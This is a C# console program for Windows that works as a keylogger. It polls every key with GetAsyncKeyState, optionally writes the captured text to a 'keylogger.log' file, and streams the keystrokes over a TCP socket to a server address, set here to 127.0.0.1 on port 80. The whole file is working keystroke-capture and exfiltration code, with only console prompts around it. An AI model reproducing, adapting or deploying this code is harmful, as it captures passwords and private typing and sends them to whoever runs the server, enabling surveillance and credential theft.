using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ConsoleApp1
{
    internal class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            bool SaveFile = false;
            string SaveLocation = "";
            Console.WriteLine("Save the log to a file? 1.Yes, 2.No.");
            SaveLocation = Console.ReadLine();
            if (SaveLocation == "1" || SaveLocation == "Yes")
            {
                SaveFile = true;
                Console.WriteLine("Where do you want to save the file? Enter the save path (Example: C:\\Users\\%USERNAME%\\Desktop\\).");
                SaveLocation = Console.ReadLine();
            }
            else
            {
                SaveFile = false;
            }
            Console.WriteLine("OK, now an attempt will be made to connect to the server. Please wait...");
            IPEndPoint serverPoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 80);
            Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
            clientSocket.Connect(serverPoint);
            if (clientSocket.Connected)
            {
                Console.WriteLine("Connect!");
                Console.WriteLine("Recording is in progress...");
                string buf = "";
                while (true)
                {
                    Thread.Sleep(100);
                    for (int i = 0; i < 255; i++)
                    {
                        int state = GetAsyncKeyState(i);
                        if (state != 0)
                        {
                            if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                            if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
                            if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
                            if (((Keys)i).ToString().Length == 1)
                            {
                                buf += ((Keys)i).ToString();
                            }
                            if (buf.Length > 5)
                            {
                                if (SaveFile == true)
                                {
                                    File.AppendAllText(SaveLocation + "keylogger.log", buf);
                                    clientSocket.Send(Encoding.UTF8.GetBytes(buf));
                                    buf = "";
                                }
                                else
                                {
                                    clientSocket.Send(Encoding.UTF8.GetBytes(buf));
                                    buf = "";
                                }
                            }
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("The program could not establish a connection.");
                clientSocket.Close();
            }
        }
    }
}
